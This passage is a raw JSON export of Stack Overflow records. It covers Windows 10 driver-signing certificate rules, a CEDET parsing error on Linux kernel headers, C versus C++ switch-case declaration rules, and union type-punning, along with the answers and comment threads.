Luo", "link": "https://stackoverflow.com/users/1087890/yang-luo"}, "edited": false, "score": 0, "creation_date": 1456802925, "post_id": 31554344, "comment_id": 59104758, "body": "@paulsm4 Hi, after one year, does the answer to this question have any updates?"}], "tags": [], "owner": {"reputation": 98775, "user_id": 421195, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/9a9793fdeb3b94e185c8c99c0238372f?s=128&d=identicon&r=PG", "display_name": "paulsm4", "link": "https://stackoverflow.com/users/421195/paulsm4"}, "is_accepted": true, "score": 2, "last_activity_date": 1437542062, "creation_date": 1437542062, "answer_id": 31554344, "question_id": 31554252, "link": "https://stackoverflow.com/questions/31554252/can-i-use-a-non-ev-certificate-to-sign-a-driver-after-windows-10-rtm-release/31554344#31554344", "title": "Can I use a non-EV certificate to sign a driver after Windows 10 RTM release?", "body": "<p>You're basically asking if you can slip a driver that wasn't signed with Extended Validation (\"EV\") certificate through the door before Windows 10 release.</p>\n\n<p>The salient point is this:</p>\n\n<blockquote>\n  <p><a href=\"http://blogs.msdn.com/b/windows_hardware_certification/archive/2015/04/01/driver-signing-changes-in-windows-10.aspx\" rel=\"nofollow\">http://blogs.msdn.com/b/windows_hardware_certification/archive/2015/04/01/driver-signing-changes-in-windows-10.aspx</a></p>\n  \n  <p>Beginning with the release of Windows 10, all new Windows 10 kernel\n  mode drivers must be submitted to and digitally signed by the Windows\n  Hardware Developer Center Dashboard portal.  Windows 10 will not load\n  new kernel mode drivers which are not signed by the portal.</p>\n</blockquote>\n\n<p>My guess is \"maybe\".</p>\n\n<p>But you'd better hurry.</p>\n\n<p>And you'd better have a Plan B if your Windows 10 customers discover that your driver won't work.</p>\n"}], "owner": {"reputation": 2009, "user_id": 1087890, "user_type": "registered", "accept_rate": 65, "profile_image": "https://www.gravatar.com/avatar/0f8ec58f46e4af3a67f768675c20aac8?s=128&d=identicon&r=PG", "display_name": "Yang Luo", "link": "https://stackoverflow.com/users/1087890/yang-luo"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 841, "favorite_count": 0, "accepted_answer_id": 31554344, "answer_count": 1, "score": 1, "last_activity_date": 1437542062, "creation_date": 1437541563, "question_id": 31554252, "link": "https://stackoverflow.com/questions/31554252/can-i-use-a-non-ev-certificate-to-sign-a-driver-after-windows-10-rtm-release", "title": "Can I use a non-EV certificate to sign a driver after Windows 10 RTM release?", "body": "<p>I am developing a <strong>kernel-mode driver</strong> and I 'd like it to be able to run on all Windows platforms (including Windows 10). I have read the driver signing policy in Win10 from <a href=\"http://blogs.msdn.com/b/windows_hardware_certification/archive/2015/04/01/driver-signing-changes-in-windows-10.aspx\" rel=\"nofollow\">http://blogs.msdn.com/b/windows_hardware_certification/archive/2015/04/01/driver-signing-changes-in-windows-10.aspx</a>. I don't know if I am understanding it right, does it mean that <strong>if I buy a non-EV cert before Win10 release (AKA 2015/7/29), I can still use the cert to sign a driver to any platform including Win10 until the cert expires</strong>. For example, I can just buy a 3-year long cert before 7/29 and use it to sign any drivers for these 3 years (the longest period for a cert seems to be 3 years). 3 years later, I have no other choice but to buy an EV cert, is this understanding right? Thanks.</p>\n"}, {"tags": ["c++", "c", "linux", "emacs", "cedet"], "answers": [{"tags": [], "owner": {"reputation": 435, "user_id": 4977258, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/muLxr.jpg?s=128&g=1", "display_name": "Jianglong Chen", "link": "https://stackoverflow.com/users/4977258/jianglong-chen"}, "is_accepted": false, "score": 0, "last_activity_date": 1437621029, "creation_date": 1437621029, "answer_id": 31577541, "question_id": 31554055, "link": "https://stackoverflow.com/questions/31554055/cedet-semantic-error-idle-service-error-semantic-idle-summary-idle-function-a/31577541#31577541", "title": "cedet-semantic error &quot;Idle Service Error semantic-idle-summary-idle-function - Arithmetic error&quot; when parsing linux kernel file &quot;jiffies.h&quot;", "body": "<p>I have solved this problem. just install the latest  cedet from <a href=\"http://sourceforge.net/p/cedet/git/ci/master/tree/\" rel=\"nofollow\">http://sourceforge.net/p/cedet/git/ci/master/tree/</a></p>\n\n<p>Why the version of cedet in emacs is 2.0? This make me feel that it is the latest version. It now seems not. At least, a bug exists.</p>\n"}], "owner": {"reputation": 435, "user_id": 4977258, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/muLxr.jpg?s=128&g=1", "display_name": "Jianglong Chen", "link": "https://stackoverflow.com/users/4977258/jianglong-chen"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 377, "favorite_count": 1, "answer_count": 1, "score": 1, "last_activity_date": 1444223474, "creation_date": 1437540447, "question_id": 31554055, "link": "https://stackoverflow.com/questions/31554055/cedet-semantic-error-idle-service-error-semantic-idle-summary-idle-function-a", "title": "cedet-semantic error &quot;Idle Service Error semantic-idle-summary-idle-function - Arithmetic error&quot; when parsing linux kernel file &quot;jiffies.h&quot;", "body": "<p>I browsed linux kernel code with emacs-24.5.1, and cedet(inlined in emacs ) for semactic parsing.</p>\n\n<p>After some usual configurations, I opened init/main.c with emacs and some hints like \"Parsing *file *% ... Done\" appeared, this proves that the cedet-semantic was working. However, an error occurred when parsing \"jiffies.h\", the error was\n\"Idle Service Error semantic-idle-summary-idle-function - Arithmetic error\".</p>\n\n<p>I googled this error to find a solution and just found a maillist:\n<a href=\"http://debbugs.gnu.org/cgi/bugreport.cgi?bug=17681\" rel=\"nofollow\">http://debbugs.gnu.org/cgi/bugreport.cgi?bug=17681</a></p>\n\n<p>Obviously, this error was caused by a bug of semantic, semantic can not parse arithmetic macro correctly. Unfortunately, I did not find a solution to this problem.</p>\n\n<p>how can I avoid this error? update cedet? Maybe the cedet in emacs-24.5.1 is the latest version.</p>\n"}, {"tags": ["c++", "c"], "comments": [{"owner": {"reputation": 54818, "user_id": 962089, "user_type": "registered", "accept_rate": 97, "profile_image": "https://i.stack.imgur.com/b6SVs.jpg?s=128&g=1", "display_name": "chris", "link": "https://stackoverflow.com/users/962089/chris"}, "edited": false, "score": 5, "creation_date": 1437539393, "post_id": 31553848, "comment_id": 51065418, "body": "<a href=\"http://stackoverflow.com/a/92730/962089\">This answer</a> is somewhat relevant."}, {"owner": {"reputation": 4212, "user_id": 4892076, "user_type": "registered", "accept_rate": 60, "profile_image": "https://i.stack.imgur.com/s6vwT.png?s=128&g=1", "display_name": "jaggedSpire", "link": "https://stackoverflow.com/users/4892076/jaggedspire"}, "edited": false, "score": 2, "creation_date": 1437539667, "post_id": 31553848, "comment_id": 51065493, "body": "It looks like the second case still works for c++ if you set <code>foo</code> in an additional statement. gcc just complains about the unused variable in <a href=\"http://coliru.stacked-crooked.com/a/ba80bc1da97d8212\" rel=\"nofollow noreferrer\">this example</a>, and clang is just fine with it."}, {"owner": {"reputation": 5258, "user_id": 1722025, "user_type": "registered", "accept_rate": 97, "profile_image": "https://i.stack.imgur.com/aS04m.jpg?s=128&g=1", "display_name": "asimes", "link": "https://stackoverflow.com/users/1722025/asimes"}, "reply_to_user": {"reputation": 54818, "user_id": 962089, "user_type": "registered", "accept_rate": 97, "profile_image": "https://i.stack.imgur.com/b6SVs.jpg?s=128&g=1", "display_name": "chris", "link": "https://stackoverflow.com/users/962089/chris"}, "edited": false, "score": 1, "creation_date": 1437539749, "post_id": 31553848, "comment_id": 51065508, "body": "@chris, Thanks, the third case kind of makes sense now (cannot jump over initialization in C++)"}, {"owner": {"reputation": 54818, "user_id": 962089, "user_type": "registered", "accept_rate": 97, "profile_image": "https://i.stack.imgur.com/b6SVs.jpg?s=128&g=1", "display_name": "chris", "link": "https://stackoverflow.com/users/962089/chris"}, "edited": false, "score": 0, "creation_date": 1437539935, "post_id": 31553848, "comment_id": 51065564, "body": "I can&#39;t see why the first isn&#39;t valid C. Looking at C99, a labeled statement is <i>identifier : statement</i> and there&#39;s no mention of a need for an expression there (I still get the error with a normal label and no switch). Edit: Never mind, GCC is more descriptive and explicitly says that a declaration is not a statement in C."}, {"owner": {"reputation": 339851, "user_id": 149392, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7a561ec0875fcbbe3066ea8fe288ec77?s=128&d=identicon&r=PG", "display_name": "sepp2k", "link": "https://stackoverflow.com/users/149392/sepp2k"}, "reply_to_user": {"reputation": 54818, "user_id": 962089, "user_type": "registered", "accept_rate": 97, "profile_image": "https://i.stack.imgur.com/b6SVs.jpg?s=128&g=1", "display_name": "chris", "link": "https://stackoverflow.com/users/962089/chris"}, "edited": false, "score": 1, "creation_date": 1437540321, "post_id": 31553848, "comment_id": 51065657, "body": "@chris A declaration is not a statement in C (but it is in C++)."}, {"owner": {"reputation": 5258, "user_id": 1722025, "user_type": "registered", "accept_rate": 97, "profile_image": "https://i.stack.imgur.com/aS04m.jpg?s=128&g=1", "display_name": "asimes", "link": "https://stackoverflow.com/users/1722025/asimes"}, "reply_to_user": {"reputation": 339851, "user_id": 149392, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7a561ec0875fcbbe3066ea8fe288ec77?s=128&d=identicon&r=PG", "display_name": "sepp2k", "link": "https://stackoverflow.com/users/149392/sepp2k"}, "edited": false, "score": 0, "creation_date": 1437540604, "post_id": 31553848, "comment_id": 51065740, "body": "@sepp2k, Well then I guess the first example (kind of) makes sense then. If <code>int foo;</code> is not a statement in C but it follows <code>case 0:</code> then I guess it should be an error"}], "answers": [{"comments": [{"owner": {"reputation": 5258, "user_id": 1722025, "user_type": "registered", "accept_rate": 97, "profile_image": "https://i.stack.imgur.com/aS04m.jpg?s=128&g=1", "display_name": "asimes", "link": "https://stackoverflow.com/users/1722025/asimes"}, "edited": false, "score": 0, "creation_date": 1437541213, "post_id": 31554138, "comment_id": 51065967, "body": "This is a nice answer but the third case is still the one that confuses me the most. How is it jumping over an initialization? Why does placing the definition inside of curly brackets avoid jumping over an initialization?"}, {"owner": {"reputation": 54818, "user_id": 962089, "user_type": "registered", "accept_rate": 97, "profile_image": "https://i.stack.imgur.com/b6SVs.jpg?s=128&g=1", "display_name": "chris", "link": "https://stackoverflow.com/users/962089/chris"}, "reply_to_user": {"reputation": 5258, "user_id": 1722025, "user_type": "registered", "accept_rate": 97, "profile_image": "https://i.stack.imgur.com/aS04m.jpg?s=128&g=1", "display_name": "asimes", "link": "https://stackoverflow.com/users/1722025/asimes"}, "edited": false, "score": 1, "creation_date": 1437541373, "post_id": 31554138, "comment_id": 51066015, "body": "@asimes, When you put braces, <code>{; int foo = 0;}</code> is the statement for the <i>labeled-statement</i>. When you don&#39;t, <code>int foo = 0;</code> is part of the switch rather than one statement for a case, so it is in scope beyond the next label, but its initialization is skipped."}, {"owner": {"reputation": 339851, "user_id": 149392, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7a561ec0875fcbbe3066ea8fe288ec77?s=128&d=identicon&r=PG", "display_name": "sepp2k", "link": "https://stackoverflow.com/users/149392/sepp2k"}, "reply_to_user": {"reputation": 5258, "user_id": 1722025, "user_type": "registered", "accept_rate": 97, "profile_image": "https://i.stack.imgur.com/aS04m.jpg?s=128&g=1", "display_name": "asimes", "link": "https://stackoverflow.com/users/1722025/asimes"}, "edited": false, "score": 0, "creation_date": 1437541384, "post_id": 31554138, "comment_id": 51066021, "body": "@asimes It&#39;s potentially jumping over the initialization because it could jump to the default case, where <code>foo</code> would be in scope, but not initialized. If you add braces, <code>foo</code> is no longer in scope in the default block. Basically the &quot;jumping over an initialization&quot; rules prohibits you from jumping &quot;in the middle&quot; of the scope of a variable that has an initializer. That is, you&#39;re allowed to jump to the initialization or after the variable has gone out of scope, but not to anywhere between those points."}, {"owner": {"reputation": 4212, "user_id": 4892076, "user_type": "registered", "accept_rate": 60, "profile_image": "https://i.stack.imgur.com/s6vwT.png?s=128&g=1", "display_name": "jaggedSpire", "link": "https://stackoverflow.com/users/4892076/jaggedspire"}, "edited": false, "score": 0, "creation_date": 1437541441, "post_id": 31554138, "comment_id": 51066042, "body": "If I may: why does separating the declaration and initialization of <code>foo</code> placate gcc, when the initialization is still in the switch statement, and being skipped by at least one case?"}, {"owner": {"reputation": 54818, "user_id": 962089, "user_type": "registered", "accept_rate": 97, "profile_image": "https://i.stack.imgur.com/b6SVs.jpg?s=128&g=1", "display_name": "chris", "link": "https://stackoverflow.com/users/962089/chris"}, "reply_to_user": {"reputation": 4212, "user_id": 4892076, "user_type": "registered", "accept_rate": 60, "profile_image": "https://i.stack.imgur.com/s6vwT.png?s=128&g=1", "display_name": "jaggedSpire", "link": "https://stackoverflow.com/users/4892076/jaggedspire"}, "edited": false, "score": 3, "creation_date": 1437541511, "post_id": 31554138, "comment_id": 51066066, "body": "@jaggedSpire, Assignment isn&#39;t initialization. You can just as easily do <code>int i; foo(i); i = 0;</code> without skipping over anything."}, {"owner": {"reputation": 5258, "user_id": 1722025, "user_type": "registered", "accept_rate": 97, "profile_image": "https://i.stack.imgur.com/aS04m.jpg?s=128&g=1", "display_name": "asimes", "link": "https://stackoverflow.com/users/1722025/asimes"}, "edited": false, "score": 0, "creation_date": 1437541550, "post_id": 31554138, "comment_id": 51066074, "body": "Thanks guys, I think I put it all together now :)"}], "tags": [], "owner": {"reputation": 339851, "user_id": 149392, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7a561ec0875fcbbe3066ea8fe288ec77?s=128&d=identicon&r=PG", "display_name": "sepp2k", "link": "https://stackoverflow.com/users/149392/sepp2k"}, "is_accepted": true, "score": 23, "last_activity_date": 1437540930, "creation_date": 1437540930, "answer_id": 31554138, "question_id": 31553848, "link": "https://stackoverflow.com/questions/31553848/c-vs-c-switch-statement-variable-definition-vs-declaration/31554138#31554138", "title": "C vs C++ switch statement variable definition vs declaration", "body": "<pre><code>case 0:\n    int foo;\n</code></pre>\n\n<p>In both C and C++ a labeled statement is a label followed by a statement. However in C++ the definition of a statement includes \"block declarations\" (that is declarations and definitions that may appear in a block) whereas in C it does not (in C a block is a sequence of \"block items\", which are either block declarations or statements - in C++ it's a sequence of statements, which include block declarations).</p>\n\n<pre><code>case 0:\n    ; int foo;\n</code></pre>\n\n<p>This works because <code>;</code> is a(n empty) statement in both C and C++, so here we indeed have a label followed by a statement.</p>\n\n<pre><code>case 0:\n    ; int foo = 0;\n</code></pre>\n\n<p>As was already explained in the comments, this does not work in C++ because C++ makes it illegal to jump over an initialization.</p>\n"}], "owner": {"reputation": 5258, "user_id": 1722025, "user_type": "registered", "accept_rate": 97, "profile_image": "https://i.stack.imgur.com/aS04m.jpg?s=128&g=1", "display_name": "asimes", "link": "https://stackoverflow.com/users/1722025/asimes"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 926, "favorite_count": 4, "accepted_answer_id": 31554138, "answer_count": 1, "score": 23, "last_activity_date": 1437540930, "creation_date": 1437539122, "last_edit_date": 1437539917, "question_id": 31553848, "link": "https://stackoverflow.com/questions/31553848/c-vs-c-switch-statement-variable-definition-vs-declaration", "title": "C vs C++ switch statement variable definition vs declaration", "body": "<p>I was playing with some syntax and found some strange compiler rules, was wondering what the reasoning is for this</p>\n\n<p><strong>C will not compile this but C++ will</strong>:</p>\n\n<pre><code>switch (argc) {\ncase 0:\n    int foo;\n    break;\ndefault:\n    break;\n}\n</code></pre>\n\n<p><strong>Both C and C++ will compile this</strong>:</p>\n\n<pre><code>switch (argc) {\ncase 0:\n    ; int foo;\n    break;\ndefault:\n    break;\n}\n</code></pre>\n\n<p><strong>C will compile this but not C++</strong>:</p>\n\n<pre><code>switch (argc) {\ncase 0:\n    ; int foo = 0;\n    break;\ndefault:\n    break;\n}\n</code></pre>\n\n<p><code>gcc -v</code> is <code>gcc version 4.9.3 (MacPorts gcc49 4.9.3_0)</code> if it matters. I realize the solution is to wrap the contents of <code>case 0:</code> with curly brackets, but I am more interested in the reasoning for compilation errors</p>\n"}, {"tags": ["c++", "c", "c99", "unions", "c89"], "comments": [{"owner": {"reputation": 142904, "user_id": 1708801, "user_type": "registered", "accept_rate": 30, "profile_image": "https://www.gravatar.com/avatar/01b9a608af886840fcf05fcfd9b5dc27?s=128&d=identicon&r=PG", "display_name": "Shafik Yaghmour", "link": "https://stackoverflow.com/users/1708801/shafik-yaghmour"}, "edited": false, "score": 0, "creation_date": 1437536324, "post_id": 31553409, "comment_id": 51064656, "body": "See <a href=\"http://stackoverflow.com/q/25664848/1708801\">Unions and type-punning</a>"}, {"owner": {"reputation": 333, "user_id": 3638462, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/aeb6323b49bc558b0d61ee7e0a9f0ebe?s=128&d=identicon&r=PG&f=1", "display_name": "Coder", "link": "https://stackoverflow.com/users/3638462/coder"}, "reply_to_user": {"reputation": 142904, "user_id": 1708801, "user_type": "registered", "accept_rate": 30, "profile_image": "https://www.gravatar.com/avatar/01b9a608af886840fcf05fcfd9b5dc27?s=128&d=identicon&r=PG", "display_name": "Shafik Yaghmour", "link": "https://stackoverflow.com/users/1708801/shafik-yaghmour"}, "edited": false, "score": 0, "creation_date": 1437536453, "post_id": 31553409, "comment_id": 51064683, "body": "@ShafikYaghmour I previously reviewed that question and it has lots of conflicting information. In particular, it seems to hint that my example is legal and well-defined. Can you clarify the rules for the specific example provided?"}, {"owner": {"reputation": 11194, "user_id": 3003365, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/dP9Od.jpg?s=128&g=1", "display_name": "kaylum", "link": "https://stackoverflow.com/users/3003365/kaylum"}, "edited": false, "score": 1, "creation_date": 1437536618, "post_id": 31553409, "comment_id": 51064729, "body": "I don&#39;t think that will even compile. <code>struct C </code>is an incomplete type. Which makes <code>struct B</code> an incomplete type. Which makes <code>union U</code> an incomplete type. There is no way (AFAIK) that you can expose U/B and hide C like that. You can only have pointers to incomplete types."}, {"owner": {"reputation": 142904, "user_id": 1708801, "user_type": "registered", "accept_rate": 30, "profile_image": "https://www.gravatar.com/avatar/01b9a608af886840fcf05fcfd9b5dc27?s=128&d=identicon&r=PG", "display_name": "Shafik Yaghmour", "link": "https://stackoverflow.com/users/1708801/shafik-yaghmour"}, "edited": false, "score": 0, "creation_date": 1437536682, "post_id": 31553409, "comment_id": 51064744, "body": "In my answer to that question, I cite both defect report 283 and a key discussion from <code>std-discussion</code> both of those should be considered authoritive. Although the <code>std-discussion</code> thread makes it clear there is a lot of unspecified behavior but what it clear is that the alternative <code>memcpy</code> is well defined and equally efficient."}, {"owner": {"reputation": 333, "user_id": 3638462, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/aeb6323b49bc558b0d61ee7e0a9f0ebe?s=128&d=identicon&r=PG&f=1", "display_name": "Coder", "link": "https://stackoverflow.com/users/3638462/coder"}, "reply_to_user": {"reputation": 11194, "user_id": 3003365, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/dP9Od.jpg?s=128&g=1", "display_name": "kaylum", "link": "https://stackoverflow.com/users/3003365/kaylum"}, "edited": false, "score": 0, "creation_date": 1437536948, "post_id": 31553409, "comment_id": 51064813, "body": "@AlanAu struct C is forward declared and done so specifically to indicate that it&#39;s type should not matter for this question. It&#39;s not meant to be actual working code."}, {"owner": {"reputation": 333, "user_id": 3638462, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/aeb6323b49bc558b0d61ee7e0a9f0ebe?s=128&d=identicon&r=PG&f=1", "display_name": "Coder", "link": "https://stackoverflow.com/users/3638462/coder"}, "reply_to_user": {"reputation": 142904, "user_id": 1708801, "user_type": "registered", "accept_rate": 30, "profile_image": "https://www.gravatar.com/avatar/01b9a608af886840fcf05fcfd9b5dc27?s=128&d=identicon&r=PG", "display_name": "Shafik Yaghmour", "link": "https://stackoverflow.com/users/1708801/shafik-yaghmour"}, "edited": false, "score": 0, "creation_date": 1437537011, "post_id": 31553409, "comment_id": 51064834, "body": "@ShafikYaghmour I was just about to ask about memcpy. Given that, it seems there is little need for my use of union. Would you agree?"}, {"owner": {"reputation": 230, "user_id": 1792302, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9a40f97f46d35e933a4bf42239651a68?s=128&d=identicon&r=PG&f=1", "display_name": "ydobonebi", "link": "https://stackoverflow.com/users/1792302/ydobonebi"}, "edited": false, "score": 0, "creation_date": 1437537677, "post_id": 31553409, "comment_id": 51065005, "body": "As for C variants, memcpy should work well as mentioned. If you do it in C++ you could create appropriate constructors to copy the data and yoru assignment operator would be good as well."}, {"owner": {"reputation": 333, "user_id": 3638462, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/aeb6323b49bc558b0d61ee7e0a9f0ebe?s=128&d=identicon&r=PG&f=1", "display_name": "Coder", "link": "https://stackoverflow.com/users/3638462/coder"}, "reply_to_user": {"reputation": 230, "user_id": 1792302, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9a40f97f46d35e933a4bf42239651a68?s=128&d=identicon&r=PG&f=1", "display_name": "ydobonebi", "link": "https://stackoverflow.com/users/1792302/ydobonebi"}, "edited": false, "score": 0, "creation_date": 1437537996, "post_id": 31553409, "comment_id": 51065076, "body": "@QuinnRoundy The code I use will need to work equally well whether compiled with a C or C++ compiler."}, {"owner": {"reputation": 333, "user_id": 3638462, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/aeb6323b49bc558b0d61ee7e0a9f0ebe?s=128&d=identicon&r=PG&f=1", "display_name": "Coder", "link": "https://stackoverflow.com/users/3638462/coder"}, "reply_to_user": {"reputation": 230, "user_id": 1792302, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9a40f97f46d35e933a4bf42239651a68?s=128&d=identicon&r=PG&f=1", "display_name": "ydobonebi", "link": "https://stackoverflow.com/users/1792302/ydobonebi"}, "edited": false, "score": 0, "creation_date": 1437538068, "post_id": 31553409, "comment_id": 51065096, "body": "@QuinnRoundy That include Visual Studio 2010, whose C compiler is C89 with elements of C99."}, {"owner": {"reputation": 333, "user_id": 3638462, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/aeb6323b49bc558b0d61ee7e0a9f0ebe?s=128&d=identicon&r=PG&f=1", "display_name": "Coder", "link": "https://stackoverflow.com/users/3638462/coder"}, "reply_to_user": {"reputation": 142904, "user_id": 1708801, "user_type": "registered", "accept_rate": 30, "profile_image": "https://www.gravatar.com/avatar/01b9a608af886840fcf05fcfd9b5dc27?s=128&d=identicon&r=PG", "display_name": "Shafik Yaghmour", "link": "https://stackoverflow.com/users/1708801/shafik-yaghmour"}, "edited": false, "score": 0, "creation_date": 1437538274, "post_id": 31553409, "comment_id": 51065144, "body": "@ShafikYaghmour Given that the conversion is from a larger type to a smaller type with matching types to the x, y, and z of struct B, does the example still suffer from undefined/implementation defined issues?"}, {"owner": {"reputation": 4964, "user_id": 556899, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/0620f543129132d44fef456b3ab31a39?s=128&d=identicon&r=PG", "display_name": "stgatilov", "link": "https://stackoverflow.com/users/556899/stgatilov"}, "edited": false, "score": 2, "creation_date": 1437539017, "post_id": 31553409, "comment_id": 51065322, "body": "I guess you&#39;ll receive quite a lot of theoretical answers like &quot;undefined dehavior in C++&quot;, &quot;valid in C99&quot;, etc. However, I&#39;m pretty sure that your code will work correctly in practice, I cannot see any reason for compiler to screw this."}, {"owner": {"reputation": 4964, "user_id": 556899, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/0620f543129132d44fef456b3ab31a39?s=128&d=identicon&r=PG", "display_name": "stgatilov", "link": "https://stackoverflow.com/users/556899/stgatilov"}, "edited": false, "score": 0, "creation_date": 1437539452, "post_id": 31553409, "comment_id": 51065437, "body": "You might want to see <a href=\"http://stackoverflow.com/questions/12164855/common-initial-sequence-in-structures-nested-within-union-definition-in-c-stan\" title=\"common initial sequence in structures nested within union definition in c stan\">stackoverflow.com/questions/12164855/&hellip;</a> and <a href=\"http://stackoverflow.com/questions/21499966/common-initial-sequence-and-alignment\" title=\"common initial sequence and alignment\">stackoverflow.com/questions/21499966/&hellip;</a>"}, {"owner": {"reputation": 333, "user_id": 3638462, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/aeb6323b49bc558b0d61ee7e0a9f0ebe?s=128&d=identicon&r=PG&f=1", "display_name": "Coder", "link": "https://stackoverflow.com/users/3638462/coder"}, "reply_to_user": {"reputation": 4964, "user_id": 556899, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/0620f543129132d44fef456b3ab31a39?s=128&d=identicon&r=PG", "display_name": "stgatilov", "link": "https://stackoverflow.com/users/556899/stgatilov"}, "edited": false, "score": 0, "creation_date": 1437539601, "post_id": 31553409, "comment_id": 51065480, "body": "@stgatilov Is there any performance advantage to using a union in the manner compared to memcpy? With union, I should be able to return a (const struct A*)u.a from a function and avoid the copy that would be imposed by memcpy. Correct?"}, {"owner": {"reputation": 4964, "user_id": 556899, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/0620f543129132d44fef456b3ab31a39?s=128&d=identicon&r=PG", "display_name": "stgatilov", "link": "https://stackoverflow.com/users/556899/stgatilov"}, "edited": false, "score": 0, "creation_date": 1437539820, "post_id": 31553409, "comment_id": 51065525, "body": "@Codorilla I think calling memcpy may be slower, unless compiler manages to remove the call (which seems unlikely). Returning other side of union by pointer is absolutely free, and by value is likely to be free too. You might want to try and look at the generated assembly. Besides, are you really sure this performance difference matter?... BTW, you can use inheritance here in C++ =)"}, {"owner": {"reputation": 333, "user_id": 3638462, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/aeb6323b49bc558b0d61ee7e0a9f0ebe?s=128&d=identicon&r=PG&f=1", "display_name": "Coder", "link": "https://stackoverflow.com/users/3638462/coder"}, "reply_to_user": {"reputation": 4964, "user_id": 556899, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/0620f543129132d44fef456b3ab31a39?s=128&d=identicon&r=PG", "display_name": "stgatilov", "link": "https://stackoverflow.com/users/556899/stgatilov"}, "edited": false, "score": 0, "creation_date": 1437539875, "post_id": 31553409, "comment_id": 51065543, "body": "@stgatilov I wonder if the guarantee regarding the initial member also holds for subsequent members whose types also match. Since it&#39;s not explicitly stated in the standard, that seems like implementation defined behavior at best."}, {"owner": {"reputation": 333, "user_id": 3638462, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/aeb6323b49bc558b0d61ee7e0a9f0ebe?s=128&d=identicon&r=PG&f=1", "display_name": "Coder", "link": "https://stackoverflow.com/users/3638462/coder"}, "reply_to_user": {"reputation": 4964, "user_id": 556899, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/0620f543129132d44fef456b3ab31a39?s=128&d=identicon&r=PG", "display_name": "stgatilov", "link": "https://stackoverflow.com/users/556899/stgatilov"}, "edited": false, "score": 0, "creation_date": 1437540111, "post_id": 31553409, "comment_id": 51065613, "body": "@stgatilov Inheritance is great, but the code needs to work for C and C++ compilers. Utilizing a C++ only feature in this context would have a ripple effect that complicates supporting both languages."}, {"owner": {"reputation": 6855, "user_id": 3125194, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/8ca2177750fa502328461e68d385e6d9?s=128&d=identicon&r=PG&f=1", "display_name": "Marian", "link": "https://stackoverflow.com/users/3125194/marian"}, "edited": false, "score": 0, "creation_date": 1437543756, "post_id": 31553409, "comment_id": 51066850, "body": "A similar sub-question: Is it UB if you cast a pointer to B to pointer to A and then use it to access first three members of B? My guess is that the C standard is going in the direction where this is (or will be) not only working but also well defined."}, {"owner": {"reputation": 333, "user_id": 3638462, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/aeb6323b49bc558b0d61ee7e0a9f0ebe?s=128&d=identicon&r=PG&f=1", "display_name": "Coder", "link": "https://stackoverflow.com/users/3638462/coder"}, "reply_to_user": {"reputation": 6855, "user_id": 3125194, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/8ca2177750fa502328461e68d385e6d9?s=128&d=identicon&r=PG&f=1", "display_name": "Marian", "link": "https://stackoverflow.com/users/3125194/marian"}, "edited": false, "score": 0, "creation_date": 1437547818, "post_id": 31553409, "comment_id": 51068681, "body": "@Marian Casting to a different type breaks strict aliasing rules. You&#39;d have to disable that compiler optimization."}, {"owner": {"reputation": 333, "user_id": 3638462, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/aeb6323b49bc558b0d61ee7e0a9f0ebe?s=128&d=identicon&r=PG&f=1", "display_name": "Coder", "link": "https://stackoverflow.com/users/3638462/coder"}, "reply_to_user": {"reputation": 11194, "user_id": 3003365, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/dP9Od.jpg?s=128&g=1", "display_name": "kaylum", "link": "https://stackoverflow.com/users/3003365/kaylum"}, "edited": false, "score": 0, "creation_date": 1437552358, "post_id": 31553409, "comment_id": 51071244, "body": "@AlanAu I&#39;ve reworked the example to eliminate your concern. Having C not explicitly defined was supposed to simplify the example, but it was obviously more of a distraction."}, {"owner": {"reputation": 12300, "user_id": 249618, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/81060fe344980bc9a3273a48b8f3e31c?s=128&d=identicon&r=PG", "display_name": "SF.", "link": "https://stackoverflow.com/users/249618/sf"}, "reply_to_user": {"reputation": 4964, "user_id": 556899, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/0620f543129132d44fef456b3ab31a39?s=128&d=identicon&r=PG", "display_name": "stgatilov", "link": 